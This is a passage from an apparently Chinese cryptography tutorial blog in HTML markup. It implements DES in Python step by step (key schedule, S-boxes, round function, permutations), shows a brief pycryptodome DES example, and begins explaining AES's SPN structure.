class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line"> <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line"> <span class="number">13</span>,  <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line"> <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 移动后合并56位压缩置换pc-2置换表</span></span><br><span class="line">__pc2 = [</span><br><span class="line"><span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>,  <span class="number">0</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>,  <span class="number">5</span>, <span class="number">20</span>,  <span class="number">9</span>,</span><br><span class="line"><span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">25</span>,  <span class="number">7</span>,</span><br><span class="line"><span class="number">15</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line"><span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line"><span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line"><span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环左移轮数对应于1位或2位</span></span><br><span class="line">ROTATIONS = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># PC_1置换函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_1</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># PC_2置换函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_2</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取子钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sub_key</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    key = PC_1(key) <span class="comment"># PC-1置换</span></span><br><span class="line">    L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:] <span class="comment"># 分成两半</span></span><br><span class="line">    skeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]): <span class="comment"># 根据轮次左移</span></span><br><span class="line">            L = L[<span class="number">1</span>:] + L[:<span class="number">1</span>]</span><br><span class="line">            R = R[<span class="number">1</span>:] + R[:<span class="number">1</span>]</span><br><span class="line">        skeys.append(PC_2(L+R)) <span class="comment"># PC-2置换</span></span><br><span class="line">    <span class="keyword">return</span> skeys</span><br><span class="line"><span class="comment"># E扩展</span></span><br><span class="line">__expansion_table = [</span><br><span class="line"><span class="number">31</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,</span><br><span class="line"> <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line"><span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line"><span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line"><span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line"><span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># S置换</span></span><br><span class="line">__sbox = [</span><br><span class="line"><span class="comment"># S1</span></span><br><span class="line">[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line"> <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S2</span></span><br><span class="line">[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S3</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4</span></span><br><span class="line">[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S5</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line"> <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S6</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line"> <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S7</span></span><br><span class="line">[<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S8</span></span><br><span class="line">[<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>],</span><br><span class="line">]</span><br><span class="line"><span class="comment"># P置换</span></span><br><span class="line">__p = [</span><br><span class="line"><span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>,</span><br><span class="line"><span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>,</span><br><span class="line"><span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>,</span><br><span class="line"><span class="number">23</span>,<span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EP</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>):  <span class="comment"># E扩展置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __expansion_table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>):   <span class="comment"># P置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F</span>(<span class="params">index: <span class="built_in">int</span>, R: <span class="type">List</span>[<span class="built_in">int</span>], skeys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    index: 代表这是第几轮</span></span><br><span class="line"><span class="string">    R: 输入数据</span></span><br><span class="line"><span class="string">    skeys: 子密钥数组</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 第一步 E扩展 32位-48位</span></span><br><span class="line">    R = EP(R)  <span class="comment"># 扩展置换</span></span><br><span class="line">    <span class="comment"># 第二步 和48位密钥异或 </span></span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, skeys[index]))  <span class="comment"># 异或</span></span><br><span class="line">    <span class="comment"># 第三步 s盒压缩处理  48bit -&gt; 32bit</span></span><br><span class="line">    B = [R[:<span class="number">6</span>], R[<span class="number">6</span>:<span class="number">12</span>], R[<span class="number">12</span>:<span class="number">18</span>], R[<span class="number">18</span>:<span class="number">24</span>], R[<span class="number">24</span>:<span class="number">30</span>], R[<span class="number">30</span>:<span class="number">36</span>], R[<span class="number">36</span>:<span class="number">42</span>], R[<span class="number">42</span>:]]  <span class="comment"># 分成八份</span></span><br><span class="line">    Bn = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#  计算该使用S盒的行坐标和列坐标</span></span><br><span class="line">        row = (B[i][<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">5</span>]</span><br><span class="line">        col = (B[i][<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) + (B[i][<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + (B[i][<span class="number">3</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">4</span>]</span><br><span class="line">        sb = __sbox[i][(row &lt;&lt; <span class="number">4</span>) + col]</span><br><span class="line">        <span class="comment"># 六位置</span></span><br><span class="line">        Bn[pos + <span class="number">0</span>] = (sb &amp; <span class="number">8</span>) &gt;&gt; <span class="number">3</span>  </span><br><span class="line">        Bn[pos + <span class="number">1</span>] = (sb &amp; <span class="number">4</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        Bn[pos + <span class="number">2</span>] = (sb &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">        Bn[pos + <span class="number">3</span>] = (sb &amp; <span class="number">1</span>)</span><br><span class="line">        pos += <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 第四步 P置换  32-32</span></span><br><span class="line">    R = P(Bn)</span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">_FP = [</span><br><span class="line"><span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line"><span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line"><span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line"><span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line"><span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line"><span class="number">32</span>,  <span class="number">0</span>, <span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆置换，相对于初始置换的逆操作，将数据放回原位</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _FP))</span><br><span class="line"><span class="comment"># =================================================================================================================</span></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">key = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line"><span class="comment"># 加密内容</span></span><br><span class="line">plain = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为二进制数组</span></span><br><span class="line">key = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> key])</span><br><span class="line">plain = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> plain])</span><br><span class="line">skeys = get_sub_key(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始IP置换</span></span><br><span class="line">block = IP(plain)</span><br><span class="line"><span class="comment"># 分为左右32比特得到L1，R1</span></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="comment"># 16轮迭代</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># 复制整个字符串</span></span><br><span class="line">    tpR = R[:]</span><br><span class="line">    <span class="comment"># R0 和 key1进行轮函数得R1</span></span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    <span class="comment"># R1 和 L0 进行异或</span></span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    <span class="comment"># 复制R1给L1</span></span><br><span class="line">    L = tpR</span><br><span class="line"><span class="comment"># 合并16轮之后的左右部分(L16和R16)</span></span><br><span class="line">block = R + L</span><br><span class="line"><span class="comment"># 逆置换</span></span><br><span class="line">block = FP(block)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,block[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>])),<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><h3 id="封装库实现"><a href="#封装库实现" class="headerlink" title="封装库实现"></a>封装库实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">des = DES.new(<span class="string">b&#x27;12345678&#x27;</span>, DES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(des.encrypt(<span class="string">b&#x27;12345678&#x27;</span>))</span><br><span class="line">m = des.encrypt(<span class="string">b&#x27;12345678&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(des.decrypt(m))</span><br></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>输入：128 比特。</li><li>输出：128 比特。</li><li>SPN 网络结构。</li></ol><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/f60151970f.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/f60151970f.png"  class="" lazyload></a><h3 id="与DES的注意点"><a href="#与DES的注意点" class="headerlink" title="与DES的注意点"></a>与DES的注意点</h3><ol><li>每一刻从64位变成128位</li><li>AES采用的的SPN网络结构与Feistel相比，可以加密整个块，并且解密必须是对加密的逆运算</li><li>SPN全称为<code>Substitution-permutation network</code>即代换-置换网络，简单的说就是会对块进行替换，置换等多重迭代操作。</li></ol><h3 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h3><ol><li><strong>AddRoundKey轮密钥加</strong><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230802155225058.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230802155225058.png"  class="" 